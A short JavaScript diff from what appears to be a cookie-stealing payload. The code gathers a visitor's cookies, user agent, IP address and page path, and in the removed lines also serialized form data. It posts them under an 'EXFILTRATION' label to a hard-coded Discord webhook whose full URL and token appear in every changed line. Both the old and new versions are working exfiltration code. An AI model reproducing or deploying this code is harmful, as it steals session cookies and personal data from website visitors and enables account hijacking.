@@ -12,8 +12,8 @@
 	ip = fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
     .then(data => {
-		discord_message("https://discord.com/api/webhooks/1226632634898059415/s59noDMH0twgLEIxtUf8Fbhyhv866ZLcTuNyFEkCWWkIrzKTmh7pzJ4zNPoOCv3S9MOo", "EXFILTRATION:\n	Cookie: " + document.cookie + "\n	User agent: " + navigator.userAgent + "\n	IP: " + data.ip + "\n	Path: " + window.location.pathname + "\n	Form:" + $('form').serialize());
+		discord_message("https://discord.com/api/webhooks/1226632634898059415/s59noDMH0twgLEIxtUf8Fbhyhv866ZLcTuNyFEkCWWkIrzKTmh7pzJ4zNPoOCv3S9MOo", "EXFILTRATION:\n	Cookie: " + document.cookie + "\n	User agent: " + navigator.userAgent + "\n	IP: " + data.ip + "\n	Path: " + window.location.pathname);
     })
     .catch(error => {
-			discord_message("https://discord.com/api/webhooks/1226632634898059415/s59noDMH0twgLEIxtUf8Fbhyhv866ZLcTuNyFEkCWWkIrzKTmh7pzJ4zNPoOCv3S9MOo", "EXFILTRATION:\n	Cookie: " + document.cookie + "\n	User agent: " + navigator.userAgent + "\n	IP: " + "failed" + "\n	Path: " + window.location.pathname + "\n	Form:" + $('form').serialize());
+			discord_message("https://discord.com/api/webhooks/1226632634898059415/s59noDMH0twgLEIxtUf8Fbhyhv866ZLcTuNyFEkCWWkIrzKTmh7pzJ4zNPoOCv3S9MOo", "EXFILTRATION:\n	Cookie: " + document.cookie + "\n	User agent: " + navigator.userAgent + "\n	IP: " + "failed" + "\n	Path: " + window.location.pathname);
     });
